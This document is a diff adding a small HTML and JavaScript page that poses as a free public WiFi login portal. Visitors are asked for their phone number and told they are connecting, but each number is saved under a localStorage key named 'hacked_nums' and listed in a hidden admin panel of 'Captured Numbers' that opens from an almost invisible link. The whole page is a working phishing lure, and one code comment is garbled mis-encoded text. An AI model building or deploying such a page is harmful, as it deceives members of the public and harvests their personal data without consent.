@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WiFi Portal - Rakan</title>
+    <style>
+        body { background-color: #e9ecef; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .box { background: white; padding: 30px; border-radius: 15px; width: 320px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        h2 { color: #007bff; }
+        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
+        button { background: #007bff; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .admin-link { margin-top: 20px; font-size: 10px; color: #eee; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="box" id="mainBox">
+        <h2>Free WiFi</h2>
+        <p>Enter phone number to connect</p>
+        <input type="text" id="userPhone" placeholder="05xxxxxxxx">
+        <button onclick="saveAndSend()">CONNECT NOW</button>
+    </div>
+
+    <div class="box" id="adminBox" style="display:none;">
+        <h2 style="color:red;">Rakan Admin Panel</h2>
+        <p>Captured Numbers:</p>
+        <div id="resultList" style="background:#f8f9fa; padding:10px; border:1px solid #ccc; text-align:left; font-family:monospace;">
+            No numbers yet...
+        </div>
+        <br>
+        <button onclick="showLogin()" style="background:#6c757d;">Back</button>
+    </div>
+
+    <div class="admin-link" onclick="showAdmin()">.</div>
+
+    <script>
+        function saveAndSend() {
+            var phone = document.getElementById("userPhone").value;
+            if(phone == "") { alert("Please enter a number!"); return; }
+
+            // Õ›Ÿ «·—ﬁ„ ›Ì –«ﬂ—… «·ÃÂ«“
+            var existing = localStorage.getItem("hacked_nums") || "";
+            localStorage.setItem("hacked_nums", existing + phone + "<br>");
+
+            alert("Connecting to WiFi... Please wait.");
+            document.getElementById("userPhone").value = "";
+        }
+
+        function showAdmin() {
+            document.getElementById("mainBox").style.display = "none";
+            document.getElementById("adminBox").style.display = "block";
+            var data = localStorage.getItem("hacked_nums");
+            if(data) document.getElementById("resultList").innerHTML = data;
+        }
+
+        function showLogin() {
+            document.getElementById("adminBox").style.display = "none";
+            document.getElementById("mainBox").style.display = "block";
+        }
+    </script>
+</body>
+</html>
